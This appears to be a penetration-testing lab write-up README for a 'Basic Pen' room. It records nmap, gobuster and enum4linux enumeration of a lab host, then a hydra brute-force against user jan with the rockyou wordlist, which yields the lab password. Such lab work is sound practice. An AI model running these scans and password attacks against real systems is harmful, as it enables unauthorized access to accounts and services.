README.MD
# Basic Pen Room.


### NMAP

Command:
```
nmap -sV -sT -A -oN basicpen_nmap.txt 10.10.179.252
```

Ports:

```
22
80
139
445
8009
8080
```

8009:
- Apache jserv (proto v1.3)
- GET, Head, Post, Options.

8080:
- Apache Tomcat 9.0.7
- 

Web Server: Apache/2.4.18
OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
PC name: basic2
smb security mode:
- Account used: Guest
- Auth level: user
- No message signing.

### Gobuster

Command:
```
gobuster -w ../../../tools/lists/directory-list-2.3-medium.txt -u 10.10.179.252 | tee gobuster_report.txt
```

Path's found:

```
/Development
```

two notes saying J has weak password and SMB setup.

### Enum4linux

Command:
```
 enum4linux -a 10.10.179.252 | tee enum4linux_report.txt
```

users: 
```
kay
jan
```

### Hydra

Command: 

```
hydra -l jan -P /usr/share/wordlist/rockyou.txt
```

Password found:
```
armando
```